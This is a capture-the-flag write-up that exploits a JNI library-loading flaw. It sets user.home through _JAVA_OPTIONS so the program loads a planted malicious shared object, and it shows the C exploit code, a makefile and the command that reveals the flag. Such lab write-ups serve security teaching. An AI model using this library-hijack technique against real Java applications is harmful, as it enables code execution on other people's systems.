<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
<head>
  <meta charset="utf-8" />
  <meta name="generator" content="pandoc" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <title>Libraries</title>
  <style>
      code{white-space: pre-wrap;}
      span.smallcaps{font-variant: small-caps;}
      span.underline{text-decoration: underline;}
      div.column{display: inline-block; vertical-align: top; width: 50%;}
  </style>
  <!--[if lt IE 9]>
    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
  <![endif]-->
      <link rel="stylesheet" type="text/css" href="../../css/global.css"></link>
      <script type="text/javascript" src="../../js/common.js"></script>
</head>
<body>
    <div id="header"><a class="header" href="../../index.html">[]|\|[-/-\|_/\/\[]|\||)</a></div>
    <div id="content" class="content" style="width:70%;height:auto">
<header id="title-block-header">
<h1 class="title">Libraries</h1>
</header>
<h3 id="the-weakness">The weakness</h3>
<p><code>hellotest</code> is written in C++, it invokes java function <code>sayHello</code> via JNI. The function is defined in <code>Helloworld.java</code>, it invokes a native function <code>print</code>.</p>
<pre><code>    ...
    public static void sayHello(String flag) throws Exception
    {
        String msg = &quot;Hello World from JNI!&quot;;
        print(msg);
        if (msg.contains(&quot;flag&quot;))
        {
            //What just happened? 
            print(&quot;What the flag? How did that happen...&quot;);
            print(&quot;Your flag is: &quot; + flag);
        }
    }
    ...
    private static native void print(String msg);
    ...</code></pre>
<p><code>print</code> is a C function, defined in <code>hellolib.c</code>, which will be used to build shared object <code>hellolib.so</code> to be loaded into JVM at runtime.</p>
<pre><code>JNIEXPORT void JNICALL Java_Helloworld_print
  (JNIEnv* env, jclass cls, jstring msg)
{
    const char* str = (*env)-&gt;GetStringUTFChars(env, msg, 0);
    printf(&quot;%s\n&quot;, str);
    if (str)
        (*env)-&gt;ReleaseStringUTFChars(env, msg, str);
    fflush(stdout);
}</code></pre>
<p><code>HelloWorld</code> copy <code>hellolib.so</code> from <code>HelloWorld.jar</code>, here comes the vulnerability, it then copy <code>hellolib.so</code> to directory <code>libFolder</code> for later invoke. <code>libFolder</code> is a directoy, named <em>“.helloWorld”</em>, under <em>System.getProperty(“user.home”)</em>. If we specify the property <em>“user.home”</em>, we can make it use library in arbitrary path.</p>
<pre><code>    private static void loadingLibrary() throws Exception
    {
        Path libFolder = Paths.get(System.getProperty(&quot;user.home&quot;), &quot;.helloWorld&quot;);
        
        //Create user folder to copy libraries from jar file.
        if (!Files.exists(libFolder))
            Files.createDirectory(libFolder);
        
        //Copy library from jar file into user folder
        Path libDest = libFolder.resolve(&quot;libhello.so&quot;);
        try
        {
        //Copy libhello if not already there.
            Files.copy(ClassLoader.getSystemResourceAsStream(&quot;libhello.so&quot;), libDest);
        }
        catch (Exception e)
        { 
            //i don&#39;t know why this is throwing an error...
            //i think this fixes it...
        }
        
        //Dynamically link to it.
        System.load(libDest.toString());
    }</code></pre>
<h3 id="create-something-evil">Create something evil</h3>
<p>We need to create a our evil <code>hellolib.c</code>, lets’ say <code>fakelib.c</code>. In the file we create a char array contains string <em>“flag”</em>.</p>
<pre><code>    jcharArray buf = (*env)-&gt;NewCharArray(env, 4);
    jchar arr[4] = {&#39;f&#39;,&#39;l&#39;,&#39;a&#39;,&#39;g&#39;};
    (*env)-&gt;SetCharArrayRegion(env, buf, 0, 4, arr); </code></pre>
<p>Assign the char array <code>buf</code> to <code>msg</code>, <em>“[C”</em> to indicate we are getting <em>value</em> field which is a char array as specified in <a href="https://docs.oracle.com/javase/7/docs/technotes/guides/jni/spec/types.html#wp276">JNI Types and Data Structures</a></p>
<pre><code>    jclass cla = (*env)-&gt;GetObjectClass(env, msg);
    jfieldID id = (*env)-&gt;GetFieldID(env, cla, &quot;value&quot;, &quot;[C&quot;);
    (*env)-&gt;SetObjectField(env, msg, id, buf);</code></pre>
<p>We need a customized makefile to build the <em>.so</em> file, since we are only allowed to create files in <em>/tmp</em>, we need to change the paths accordingly.</p>
<pre><code>libhello.so : fakelib.o
    cc fakelib.o -shared -o libhello.so
    mkdir -p .helloWorld
    cp libhello.so .helloWorld
    
fakelib.o : 
    cp /home/lib/Helloworld.h .
    cc  -c -I/usr/lib/jvm/java-8-openjdk-amd64/include -fpic fakelib.c</code></pre>
<p>*_JAVA_OPTIONS* is way to specify JVM arguments as an environment variable instead of command line parameters. Run <code>hellotest</code> in <code>/home/lib</code> directory with *_JAVA_OPTIONS=“-Duser.home=/tmp”*.</p>
<pre><code>$ _JAVA_OPTIONS=&quot;-Duser.home=/tmp&quot; /home/lib/hellotest
Picked up _JAVA_OPTIONS: -Duser.home=/tmp
fakelib                                                                                                                                                                 
Hello World from JNI!                   
fakelib                                 
What the flag? How did that happen...
fakelib
Your flag is: CTF{JN1_1s_r3a77y_f4n!}</code></pre>
<h3 id="reference">Reference</h3>
<ul>
<li><a href="https://docs.oracle.com/javase/7/docs/technotes/guides/jni/spec/types.html#wp276">JNI Types and Data Structures</a></li>
<li><a href="https://docs.oracle.com/en/java/javase/13/docs/specs/jni/functions.html">Chapter 4: JNI Functions</a></li>
</ul>
    </div>
    <a id="back-to-top" class="back-to-top" href="#header">TOP</a>
</body>
</html>
